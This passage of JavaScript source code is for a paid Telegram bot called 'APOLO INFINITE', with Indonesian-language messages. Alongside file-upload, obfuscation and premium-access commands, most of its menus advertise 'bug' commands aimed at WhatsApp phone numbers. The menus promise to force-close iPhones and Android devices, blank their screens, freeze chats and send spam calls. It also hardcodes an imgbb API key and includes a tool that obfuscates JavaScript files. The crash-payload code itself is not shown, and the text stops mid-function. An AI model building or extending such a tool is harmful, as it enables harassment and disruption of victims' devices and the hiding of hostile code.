bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});



const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const pendingVerification = new Set();
// ================
// 🔐 VERIFIKASI TOKEN
// ================
bot.use(async (ctx, next) => {
  if (secureMode) return next();
  if (tokenValidated) return next();

  const chatId = (ctx.chat && ctx.chat.id) || (ctx.from && ctx.from.id);
  if (!chatId) return next();
  if (pendingVerification.has(chatId)) return next();
  pendingVerification.add(chatId);

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
  const frames = [
    "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%"
  ];

  let loadingMsg = null;

  try {
    loadingMsg = await ctx.reply("⏳ *BOT SEDANG MEMVERIFIKASI TOKEN...*", {
      parse_mode: "Markdown"
    });

    for (const frame of frames) {
      if (tokenValidated) break;
      await sleep(180);
      try {
        await ctx.telegram.editMessageText(
          loadingMsg.chat.id,
          loadingMsg.message_id,
          null,
          `🔐 *Verifikasi Token Server...*\n${frame}`,
          { parse_mode: "Markdown" }
        );
      } catch { /* skip */ }
    }

    if (!databaseUrl || !tokenBot) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Konfigurasi server tidak lengkap.*\nPeriksa `databaseUrl` atau `tokenBot`.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Fungsi ambil data token pakai HTTPS native
    const getTokenData = () => new Promise((resolve, reject) => {
      https.get(databaseUrl, { timeout: 6000 }, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          try {
            const json = JSON.parse(data);
            resolve(json);
          } catch {
            reject(new Error("Invalid JSON response"));
          }
        });
      }).on("error", (err) => reject(err));
    });

    let result;
    try {
      result = await getTokenData();
    } catch (err) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Gagal mengambil daftar token dari server.*\nSilakan coba lagi nanti.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    const tokens = (result && Array.isArray(result.tokens)) ? result.tokens : [];
    if (tokens.length === 0) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Token tidak tersedia di database.*\nHubungi admin untuk memperbarui data.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Validasi token
    if (tokens.includes(tokenBot)) {
      tokenValidated = true;
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "✅ *Token diverifikasi server!*\nMembuka menu utama...",
        { parse_mode: "Markdown" }
      );
      await sleep(1000);
      pendingVerification.delete(chatId);
      return next();
    } else {
      const keyboardBypass = {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/Dikzztengg" }]
        ]
      };

      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "*Bypass Detected!*\nToken tidak sah atau tidak terdaftar.\nYour access has been restricted.",
        { parse_mode: "Markdown" }
      );

      await sleep(500);
      await ctx.replyWithPhoto("https://files.catbox.moe/xkk65u.jpg", {
        caption:
          "🚫 *Access Denied*\nSistem mendeteksi token tidak valid.\nGunakan versi original dari owner.",
        parse_mode: "Markdown",
        reply_markup: keyboardBypass
      });

      pendingVerification.delete(chatId);
      return;
    }

  } catch (err) {
    console.error("Verification Error:", err);
    if (loadingMsg) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Terjadi kesalahan saat memverifikasi token.*",
        { parse_mode: "Markdown" }
      );
    } else {
      await ctx.reply("⚠️ *Terjadi kesalahan saat memverifikasi token.*", {
        parse_mode: "Markdown"
      });
    }
  } finally {
    pendingVerification.delete(chatId);
  }
});

// =========================
// START COMMAND & 
// =========================
bot.start(async (ctx) => {
  if (!tokenValidated)
    return ctx.reply("❌ *Token belum diverifikasi server.* Tunggu proses selesai.", { parse_mode: "Markdown" });
  
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();

  // ============================
  // 🔓 OWNER BYPASS FULL
  // ============================
  if (!isOwner) {
    // Jika user buka di private → blokir
    if (ctx.chat.type === "private") {
      // Kirim notifikasi ke owner
      bot.telegram.sendMessage(
        ownerID,
        `📩 *NOTIFIKASI START PRIVATE*\n\n` +
        `👤 User: ${ctx.from.first_name || ctx.from.username}\n` +
        `🆔 ID: <code>${ctx.from.id}</code>\n` +
        `🔗 Username: @${ctx.from.username || "-"}\n` +
        `💬 Akses private diblokir.\n\n` +
        `⌚ Waktu: ${new Date().toLocaleString("id-ID")}`,
        { parse_mode: "HTML" }
      );
      return ctx.reply("❌ Bot ini hanya bisa digunakan di grup yang memiliki akses.");
    }
  }
  
 
if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}

  const menuMessage = `
<pre><code class="language-javascript">
𖥂 APOLO INFINITE 𖥂
Powerful • Secure • Exclusive • Auto Update

Owners : @Dikzztengg
My patner : @Xatanicvxii

Harga Users : Rp15.000 
Harga Reseller : Rp35.000

Klik button di bawah untuk melanjutkan →
</code></pre>`;

  const keyboard = [
        [
            {
                text: "(⎊) ʙᴜᴋᴀ ☇ ᴍᴇɴᴜ",
                callback_data: "bug2", style : "primary"
            }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action("menu", async (ctx) => {
  if (!tokenValidated)
    return ctx.answerCbQuery("🔑 Token belum diverifikasi server.");

  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
<pre><code class="language-javascript">
𖥂 APOLO INFINITE 𖥂
Powerful • Secure • Exclusive • Auto Update

Owners : @Dikzztengg
My patner : @Xatanicvxii

Harga Users : Rp15.000 
Harga Reseller : Rp35.000

Klik button di bawah untuk melanjutkan →
</code></pre>`;

  const keyboard = [
        [
            {
                text: "(⎊) ʙᴜᴋᴀ ☇ ᴍᴇɴᴜ",
                callback_data: "bug2", style : "primary"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            (error.response.description.includes("メッセージは変更されませんでした") || 
             error.response.description.includes("message is not modified"))
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ======================
// CALLBACK UNTUK MENU UTAMA (HOME)
// ======================
bot.action("menu_home", async (ctx) => {
  if (!tokenValidated)
    return ctx.answerCbQuery("🔑 Token belum diverifikasi server.");

  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
<pre><code class="language-javascript">
══─⊱ APOLO INFINITE ⊰─══◯
 OWNER : @Dikzztengg
 VERSION : 6.5

 ◯══─⊱ STATUS BOT ⊰─══◯
 𝙱𝙾𝚃 𝚂𝚃𝙰𝚃𝚄𝚂 : ${premiumStatus}
 USERNAME : @${ctx.from.username || "Tidak Ada"}
 𝚄𝚂𝙴𝚁 𝙸𝙳   : <code>${userId}</code>
 𝚂𝚃𝙰𝚃𝚄𝚂 𝚂𝙴𝙽𝙳𝙴𝚁 : ${senderStatus}
 𝙱𝙾𝚃 𝚄𝙿𝚃𝙸𝙼𝙴 : ${runtimeStatus}

 ◯══─⊱ SECURITY ⊰─══◯
 𝙾𝚃𝙿 𝚂𝚈𝚂𝚃𝙴𝙼 : 𝙰𝙲𝚃𝙸𝚅𝙴
 𝚃𝙾𝙺𝙴𝙽 𝚅𝙴𝚁𝙸𝙵𝙸𝙲𝙰𝚃𝙸𝙾𝙽 : 𝙴𝙽𝙰𝙱𝙻𝙴𝙳

 ────────────────────────
 CINTA DI TOLAK
 BUG WHATSAPP
 BERTINDAK
 ────────────────────────

✦─⟦ THANKS ⟧─✦</code></pre>`;

  const keyboard = [
        [
            { text: "◀️", callback_data: "menu_tqto", style : "Danger" },
            { text: "HOME", callback_data: "menu_home", style : "primary" },
            { text: "▶️", callback_data: "menu_controls", style : "Success" }
        ],
        [
            { text: "Owner", url: "https://t.me/Dikzztengg", style : "primary" }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            (error.response.description.includes("メッセージは変更されませんでした") || 
             error.response.description.includes("message is not modified"))
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ======================
// MENU CONTROLS
// ======================
bot.action('menu_controls', async (ctx) => {
    const controlsMenu = `
<pre><code class="language-javascript">
⬡═―—⊱ SYSTEM CONTROL ⊰―—═⬡
•  /connect     → ADD SENDER
•  /setcd      → SET COOLDOWN
•  /killsesi   → RESET SESSION
•  /update  → UPDATE OTOMATIS
•  /sky   → BLOCK CMD
•  /bukacmd   → BUKA CMD
•  /addprem    → ADD PREMIUM
•  /delprem    → DELETE PREMIUM
•  /addpremgrup   → ADD PREMIUM GROUP
•  /delpremgrup   →  DELETE PREMIUM  GROUP →
</code></pre>`;

    const keyboard = [
        [
            {
                text: "(⎊) ☇ ʙᴀᴄᴋ",
                callback_data: "menu_toolss", style : "success"
            },
            {
                text: "(⎊) ☇ ɴᴇxᴛ",
                callback_data: "menu_tqto", style : "success"
            },
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && 
            (error.response.description.includes("メッセージは変更されませんでした") || 
             error.response.description.includes("message is not modified"))) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ======================
// MENU TOOLSS
// ======================
bot.action('menu_toolss', async (ctx) => {
    const toolssMenu =`
<pre><code class="language-Javascript">
⬡═―—⊱ DEVICE & GENERATOR ⊰―—═⬡
•  /iqc        → IPHONE GENERATOR
•  /zenc      → ENCRYTED FILE.JS
•  /play       → PLAY MUSIC SPOTIFY
•  /fixcode    → FIXED FILE.JS
•  /brat       → BRAT STICKER
•  /bratbahlil  → BRAT BAHLIL
•  /tiktok      → DOWNLOADER TIKTOK
•  /tourl2      → TO URL IMAGE
•  /fakecall    → REPLY FOTO TO AVATAR →
</code></pre>`;

    const keyboard = [
        [
            {
                text: "(⎈) ☇ ʙᴀᴄᴋ",
                callback_data: "bug2", style : "danger"
            },
            {
                text: "(⚒) ☇ ɴᴇxᴛ",
                callback_data: "menu_controls", style : "danger"
            },
        ]
    ];

    try {
        await ctx.editMessageCaption(toolssMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && 
            (error.response.description.includes("メッセージは変更されませんでした") || 
             error.response.description.includes("message is not modified"))) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di toolss menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ======================
// PILIH MENU BUG 
// ======================

bot.action('bug2', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug2Menu = `\`\`\`js 

⬡═—⊱ BEBAS SPAM BUG ⊰—═⬡  
• /Delayspam → BEBAS SPAM BUG  
• /delaykunti → BEBAS SPAM BUG       
• /xdelay → BEBAS SPAM BUG     
• /delayinvs → BEBAS SPAM BUG 
• /Zupers → BEBAS SPAM BUG      
• /delaysw → BEBAS SPAM BUG      

⬡═—⊱ IPHONE BUG ⊰—═⬡
• /xcfc → FORCE CLOSE IOS
• /Xblankui → BLANK IOS BUG

⬡═—⊱ ANDROID BUG ⊰—═⬡
• /xuiandro → BLANK DEVICE UI
• /xandro → BLANK STUCK DEVICE
• /xforce → FORCE CLOSE ANDROID
• /xperma → DELAY PERMANENT 
• /Delay → DELAY HARD ANDROID
• /xBall → FRANK SPAM CALL X VIDIO →
\`\`\``;

    const keyboard = [
        [
            {
                text: "(⇋) ☇ ʙᴀᴄᴋ",
                callback_data: "menu", style : "primary"
            },
            {
                text: "(⎈) ☇ ɴᴇxᴛ",
                callback_data: "bug4", style : "primary"
            },
        ]
    ];

    try {
        await ctx.editMessageCaption(bug2Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('bug3', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug3Menu = `\`\`\`js  
🌙 FORCLOSE BUG 🌙

⬡═―—⊱ FORCLOSE TYPE ⊰―—═⬡
  /virtex   - 628xx [ Crash VISIBLE ]
  /ghostfc           - 628xx [ FC HARD VISIBLE ]
  /Fcios    - 628xx [ FC IOS SPAM  ]
  
🌙 IDUL FITRI KAREENN 🌙
\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/bug1", style : "primary"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug3Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('bug4', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug4Menu = `\`\`\`js   

⬡═—⊱ BEBAS SPAM BUG ⊰—═⬡
• /buldozer → BEBAS SPAM BUG
• /kingcdelay → BEBAS SPAM BUG
• /clowdelay → BEBAS SPAM BUG
• /inTs → BEBAS SPAM BUG
• /delaychat → BEBAS SPAM BUG
• /Hecate → FC IOS BEBAS SPAM BUG

\`\`\``;

    const keyboard = [
        [
            {
                text: "(⇋) ☇ ʙᴀᴄᴋ",
                callback_data: "bug2", style : "primary"
            },
            {
                text: "(⎈) ☇ ɴᴇxᴛ",
                callback_data: "menu_toolss", style : "primary"
            },
        ]
    ];

    try {
        await ctx.editMessageCaption(bug4Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('bug', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug5Menu = `\`\`\`js
🌙 MURBUG 🌙

⬡═―—⊱ MURBUG TYPE ⊰―—═⬡
  /XivorX        - 628xx [ DELAY FOR MURBUG ]
  /ZypherZ       - 628xx [ DELAY HARD BEBAS SPAM ]
  /VyNeTr        - 628xx [ DELAY BEBAS SPAM ]
  /Xynerx        - 628xx [ DELAY FOR MURBUG ]
  /FoxHad         - 628xx [ DELAY FOR MURBUG ]
  /Xbugs         - 628xx [ DELAY FOR MURBUG ]
🌙 IDUL FITRI KAREENN 🌙
\`\`\``;

    const keyboard = [
        [
            {
                text: "",
                callback_data: "/menu_bug", style : "success"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug5Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('bug6', async (ctx) => {
